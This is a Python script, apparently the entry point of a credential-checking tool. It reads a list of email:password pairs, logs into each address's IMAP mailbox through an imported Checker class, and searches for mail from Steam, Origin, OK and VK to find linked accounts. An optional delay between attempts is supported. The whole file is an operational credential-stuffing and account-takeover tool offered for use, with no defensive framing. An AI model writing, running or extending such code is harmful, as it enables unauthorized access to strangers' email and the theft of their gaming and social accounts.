import sys

from Checker import Checker

argv = sys.argv[1:]
all_count = 0
correct_count = 0
if (len(argv)) <= 1:
    print("Usage: main.py -O path/to/emails.txt --vk --steam --ok --origin")
else:
    try:
        argv.index("-O")
    except ValueError:
        print("Usage: main.py -O path/to/emails.txt --vk --steam --ok --origin")
        sys.exit(-1)
    if(argv.index("-O")>-1):
        checker = Checker()
        f = open(argv[argv.index("-O")+1],"r")
        lines = f.readlines()
        for line in lines:
            all_count += 1
            print("Checked {}% of the total".format(round(all_count/len(lines)*100)))
            line = line.rstrip()
            email,password = line.split(":")
            checker.setEmail(email)
            checker.setPassword(password)
            if checker.setIMAPServer(email) == -1:
                continue
            for arg in argv:
                if arg == "--steam":
                    checker.setSTEAM()
                if arg == "--origin":
                    checker.setORIGIN()
                if arg == "--ok":
                    checker.setOK()
                if arg == "--vk":
                    checker.setVK()
                if arg == "-t":
                    second = argv[argv.index("-t")+1]
                    checker.setTimeToSleep(int(second))
            result = checker.search()
            checker.clearEmails()
        checker.saveResult()
        f.close()

